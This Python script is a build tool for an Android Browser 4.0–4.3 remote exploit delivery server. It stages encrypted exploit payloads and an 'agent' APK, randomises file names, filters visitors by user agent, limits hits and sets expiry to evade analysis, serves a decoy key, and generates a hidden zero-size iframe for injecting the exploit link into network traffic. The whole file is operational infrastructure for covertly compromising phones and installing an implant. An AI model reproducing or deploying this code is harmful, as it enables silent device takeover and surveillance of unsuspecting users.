#!/usr/bin/env python

import os
import sys
import copy
import stat
import time
import pprint
import shutil
import string
import random
import argparse
import datetime
import ConfigParser

from os.path import join as pjoin

def readfile(name):
    with open(name, "rb") as fp:
        content = fp.read()

    return content

# [ AES implementation selection ] ------------------------------------------- #

# If PyCrypto is installed use it, otherwise use slowaes

try:
    from Crypto import Random
    from Crypto.Cipher import AES

    class AESCipher:
        def __init__(self, key):
            '''
            Initialize the AES cipher with a 32 byte key.
            '''
            self.bs = 16
            if len(key) != 32:
                raise Exception("Invalid AES256 key length")

            self.key = key

        def encrypt(self, raw):
            raw = self._pad(raw)
            iv = Random.new().read(AES.block_size)
            cipher = AES.new(self.key, AES.MODE_CBC, iv)
            return iv + cipher.encrypt(raw)

        def decrypt(self, enc):
            enc = base64.b64decode(enc)
            iv = enc[:AES.block_size]
            cipher = AES.new(self.key, AES.MODE_CBC, iv)
            return self._unpad(cipher.decrypt(enc[AES.block_size:]))

        def _pad(self, s):
            return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)

        @staticmethod
        def _unpad(s):
            return s[:-ord(s[len(s)-1:])]

    print "AES cipher: PyCrypto"
            
except ImportError:
    import slowaes

    class AESCipher:
        def __init__(self, key):
            '''
            Initialize the AES cipher with a 32 byte key.
            '''
            self.bs = 16
            if len(key) != 32:
                raise Exception("Invalid AES256 key length")

            self.key = key

        def encrypt(self, raw):
            return slowaes.encryptData(self.key, raw)

        def decrypt(self, enc):
            return slowaes.decryptData(self.key, enc)

    print "AES cipher: slowaes"


# [ EDN Build functions ] ---------------------------------------------------- #

EDIT_FILES = ["go.html", "script.js", "stage4.js", "stage4_js.py", "redir.js"]
COPY_FILES = ["module.so", "stage1_xml.py", "stylesheet.xsl"]

def edn_build(exploit_type, target_directory, ip, prefix, redirect, apk, expiry,
              port=None, landing=None, script_name=None, stage4_name=None,
              exploit_name=None, apk_name=None, key=None, fake_key=None,
              module_name=None, debug_mode=False, outputfile=None,
              serveraddr=None):
    '''
    edn_build parameters:
    
    example target URI:

    http://1.2.3.4:8080/abcdef/ghijkl
           -------|----|------|------
             IP    port prefix landing(optional)
            addr
    
    Mandatory parameters:
    -----------------------------------------------
    target_directory: where to write the built files
    ip: the ip address as a string
    prefix: the webserver directory prefix
    redirect: the redirect URI
    apk: the APK installer

    Optional paramters:
    -----------------------------------------------
    port: the webserver port (default: 80)
    landing: the name of the landing page (default: fwd)
    module_name: the new name for module.so (default: m(random)*)
    script_name: the new name for script.js (default: s(random)*)
    stage4_name: the new name for stage4.js (default: t(random)*)
    exploit_name: the new name for the exploit binary (default: x(random)*)
    apk_name: the new apk name (default: a(random*))
    key: the AES256 encryption key (raw) (default: random)
    fake_key: the fake key to be served by stage4 if the magic number does not
              match (raw) (default: random)
    
    edn_scripts: set it to False in order not to write edn config files
    '''

    # Default values
    if landing is None:
        landing = "fwd"          # Default name

    if script_name is None:
        script_name = "s" + rndchars(5)

    if stage4_name is None:
        stage4_name = "t" + rndchars(5) + ".js"

    if exploit_name is None:
        exploit_name = "x" + rndchars(5)

    if apk_name is None:
        apk_name = "a" + rndchars(5) + ".apk"

    if module_name is None:
        module_name = "m" + rndchars(5)

    if key is None:
        key = ''.join([chr(random.randrange(256)) for i in range(32)])
        
    if fake_key is None:
        fake_key = ''.join([chr(random.randrange(256)) for i in range(32)])

    if port is None:
        port = 80

    prefix = prefix.strip("/")

    # Build the parameter substitution dictionary
    sub = {
        "B_REDIRECT_URI": redirect,
        "B_SCRIPT_NAME": script_name,
        "B_STAGE4_REF": stage4_name,
        "B_MODULE_REF": module_name,
        "B_EXPLOIT_REF": "/" + (prefix + "/" + exploit_name).strip("/"),
        "B_APK_REF": "/" + (prefix + "/" + apk_name).strip("/"),
        "B_EXPLOIT_NAME": exploit_name,
        "B_APK_NAME": apk_name,
        "B_IP": ip,
        "B_PORT": str(port),
        "B_KEY": repr(key),
        "B_FAKE_KEY": repr(fake_key)
    }

    print "Build configuration:"
    pprint.pprint(sub)

    if debug_mode is False:
        data_directory = pjoin(target_directory, "data")
    else:
        data_directory = target_directory

    try:
        os.makedirs(data_directory)
    except OSError: # Directories already exist
        pass

    # Perform substitutions
    for filename in EDIT_FILES:
        tpl = string.Template(readfile(filename))
        content = tpl.safe_substitute(sub)

        with open(pjoin(data_directory, filename), "w+") as fp:
            fp.write(content)

        print "Wrote " + pjoin(data_directory, filename)

    # Copy static files
    for filename in COPY_FILES:
        try:
            shutil.copy(filename, pjoin(data_directory, filename))
        except shutil.Error as e:
            if "same file" in e.message:
                pass
            else:
                raise

        print "Wrote " + pjoin(data_directory, filename)

    encrypt("exploit", pjoin(data_directory, "exploit"), key)
    encrypt(apk, pjoin(data_directory, "installer.apk"), key)

    if serveraddr is None:
        serveraddr = ip

    if debug_mode is True:
        return

    if outputfile is not None:
        uri = "http://{}/{}/fwd".format(serveraddr, prefix)
        if exploit_type == "androidhosted":
            outputfile.write(uri)
        elif exploit_type == "androidhtml":
            outputfile.write(generate_html(uri))

    # Write configuration files and set necessary permissions
    baseconfig = {
        "general": {
            "expiry": 0,
            "hits": 4
        },
        "valid": {
            "headers[Content-Type]": "text/html"
        },
        "invalid": {"type": 404},
        "filters": {
            "parent": "/android browser 4\.[0123]/i",
            "useragent": "/android 4/i"
        }
    }
    
    names = []
    config = copy.deepcopy(baseconfig)
    config["valid"]["type"] = "exec"
    config["valid"]["path"] = "./stage1_xml.py"
    config["valid"]["headers[Content-Type]"] = "application/xml"
    name = "data.xml"
    write_edn_config(target_directory, name, config)
    names.append(name)

    # Set +x permission
    path = pjoin(data_directory, "stage1_xml.py")
    st = os.stat(path)
    mode = st.st_mode
    mode |= stat.S_IXGRP | stat.S_IXOTH | stat.S_IXUSR
    mode |= stat.S_IRGRP | stat.S_IROTH | stat.S_IRUSR
    os.chmod(path, mode)

    config = copy.deepcopy(baseconfig)
    config["valid"]["type"] = "data"
    config["valid"]["path"] = "module.so"
    config["valid"]["headers[Content-Type]"] = "application/octet-stream"
    name = module_name
    write_edn_config(target_directory, name, config)
    names.append(name)

    config = copy.deepcopy(baseconfig)
    config["valid"]["type"] = "data"
    config["valid"]["path"] = "script.js"
    config["valid"]["headers[Content-Type]"] = "text/javascript"
    name = script_name + "id.js"
    write_edn_config(target_directory, name, config)
    names.append(name)

    config = copy.deepcopy(baseconfig)
    config["valid"]["type"] = "data"
    config["valid"]["path"] = "redir.js"
    config["valid"]["headers[Content-Type]"] = "text/javascript"
    write_edn_config(target_directory, script_name + "idm.js", config)
    write_edn_config(target_directory, script_name + "idp.js", config)
    names.append(script_name + "idm.js")
    names.append(script_name + "idp.js")

    config = copy.deepcopy(baseconfig)
    config["valid"]["type"] = "exec"
    config["valid"]["path"] = "./stage4_js.py"
    config["valid"]["headers[Content-Type]"] = "text/javascript"
    name = stage4_name
    write_edn_config(target_directory, name, config)
    names.append(name)

    # Set +x permission
    path = pjoin(data_directory, "stage4_js.py")
    st = os.stat(path)
    mode = st.st_mode
    mode = mode | stat.S_IXGRP | stat.S_IXOTH | stat.S_IXUSR
    mode = mode | stat.S_IRGRP | stat.S_IROTH | stat.S_IRUSR
    os.chmod(path, mode)

    config = copy.deepcopy(baseconfig)
    config["valid"]["type"] = "data"
    config["valid"]["path"] = "stylesheet.xsl"
    config["valid"]["headers[Content-Type]"] = "application/xml"
    name = "stylesheet.xsl"
    write_edn_config(target_directory, name, config)
    names.append(name)

    config = copy.deepcopy(baseconfig)
    config["valid"]["type"] = "data"
    config["valid"]["path"] = "exploit"
    config["valid"]["headers[Content-Type]"] = "text/html"
    config["filters"] = {}
    config["filters"]["useragent"] = "/geko/i"
    name = exploit_name
    write_edn_config(target_directory, name, config)
    names.append(name)

    config = copy.deepcopy(baseconfig)
    config["general"]["pos"] = "last"
    config["valid"]["type"] = "data"
    config["valid"]["path"] = "installer.apk"
    config["valid"]["headers[Content-Type]"] = "text/html"
    config["filters"] = {}
    config["filters"]["useragent"] = "/geko/i"    
    config["related"] = {}
    for name in names:
        config["related"][name] = "0"
        
    config["related"][apk_name] = "0"
    config["related"][landing] = "0"
    
    name = apk_name
    write_edn_config(target_directory, name, config)
    names.append(name)

    # Landing page
    # Compute expiry date as build date + 7 days
    # dt = datetime.datetime.now()
    # dt = dt + datetime.timedelta(days=7)
    # expiry = int(time.mktime(dt.timetuple()))

    config = copy.deepcopy(baseconfig)
    config["general"]["expiry"] = expiry
    # Hits is 2 because if the phone crashes the fist time we might have
    # better luck when the browser is restarted if the last page is
    # automatically reloaded
    config["general"]["hits"] = 2
    config["general"]["pos"] = "first"
    config["valid"]["type"] = "data"
    config["valid"]["path"] = "go.html"
    config["valid"]["headers[Content-Type]"] = "text/html"
    config["invalid"] = {}
    config["invalid"]["type"] = "301"
    config["invalid"]["headers[Location]"] = redirect
    config["related"] = {}
    for name in names:
        config["related"][name] = "+5min"
    write_edn_config(target_directory, landing, config)

# HTML for TNI injection
def generate_html(uri):
    html = ''
    html += '<script type="text/javascript">'
    html += 'window.addEventListener("DOMContentLoaded", function() {'
    html += 'var iframe = document.createElement("iframe");'
    html += 'iframe.style.height = 0;'
    html += 'iframe.style.width = 0;'
    html += 'iframe.style.border = "none";'
    html += 'iframe.setAttribute("src", "{}");'.format(uri)
    html += 'document.body.appendChild(iframe);'
    html += '}, false);'
    html += '</script>'

    return html

ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxzy"

def encrypt(source, destination, key):
    print "Encrypting {} -> {}".format(source, destination)
    content = readfile(source)
    cipher = AESCipher(key)
    enc = cipher.encrypt(content)
    with open(destination, "wb+") as fp:
        fp.write(enc)

def rndchars(n):
    return ''.join([random.choice(ALPHABET) for i in range(n)])

# [ EDN config file writer ] ------------------------------------------------- #

def write_edn_config(target_directory, filename, options):
    config = ConfigParser.RawConfigParser()

    # Prevent ConfigParser from transforming option names to lowercase
    config.optionxform = str

    for k in options:
        config.add_section(k)
        for optk in options[k]:
            config.set(k, optk, options[k][optk])

    confpath = pjoin(target_directory, filename + ".ini")
    with open(confpath, "w") as fp:
        config.write(fp)

    print "Wrote EDN config file: {}".format(confpath)
    

def main():

    parser = argparse.ArgumentParser(
        description="Android Browser 4.0.x-4.3 remote exploit EDN build script"
    )
    parser.add_argument("--type",
                        help="The exploit type",
                        choices=["androidhosted", "androidhtml"], required=True)
    
    parser.add_argument("--outdir", help="Where to write the built files",
                        type=str, required=True)
    parser.add_argument("--serverip", help="The server IP address",
                        type=str, required=True)
    parser.add_argument("--basedir", help="The webserver directory prefix",
                        required=True)
    parser.add_argument("--agent", help="The APK path", required=True)
    parser.add_argument("--expiry", help="The exploit expiration timestamp",
                        type=int, required=True)
    
    parser.add_argument("--redirect", help="The redirect URI")

    parser.add_argument("--serveraddr", help="The server hostname",
                        type=str)

    parser.add_argument("--output",
                        help="The file where to write the output URI",
                        type=argparse.FileType('w'))

    parser.add_argument("-p", "--port", help="The server port")
    parser.add_argument("-l", "--landing-name",
                        help="The name of the landing page")
    parser.add_argument("-m", "--module-name",
                        help="The module name")
    parser.add_argument("-s", "--script-name",
                        help="The new name for script.js")
    parser.add_argument("-t", "--stage4-name",
                        help="The new name for stage4.js")
    parser.add_argument("-x", "--exploit-name",
                        help="The exploit name")
    parser.add_argument("-a", "--apk-name",
                        help="The apk name")
    parser.add_argument("-k", "--key",
                        help="The AES256 key in hex form " \
                        "(e.g. 012345678ABCDEF012345678ABCDEF)")
    parser.add_argument("-f", "--fake-key",
                        help="The AES256 FAKE key in hex form " \
                        "(e.g. 012345678ABCDEF012345678ABCDEF)")
    
    args, unkargs = parser.parse_known_args()

    if args.key is None:
        key = None
    else:
        key = args.key.decode("hex")

    if args.fake_key is None:
        fake_key = None
    else:
        fake_key = args.fake_key.decode("hex")

    if args.type == "androidhtml":
        redirect = "about:blank"
    elif args.redirect is None:
        print "Missing required argument redirect"
        return
    elif (not args.redirect.lower().startswith("http")):
        redirect = "http://" + args.redirect
    else:
        redirect = args.redirect
    
    edn_build(args.type, args.outdir, args.serverip, args.basedir, redirect, args.agent, args.expiry,
              port=args.port, landing=args.landing_name, script_name=args.script_name,
              stage4_name=args.stage4_name, exploit_name=args.exploit_name,
              apk_name=args.apk_name, key=key, fake_key=fake_key,
              module_name=args.module_name, debug_mode=False, outputfile=args.output,
              serveraddr=args.serveraddr)


if __name__ == "__main__":
    main()
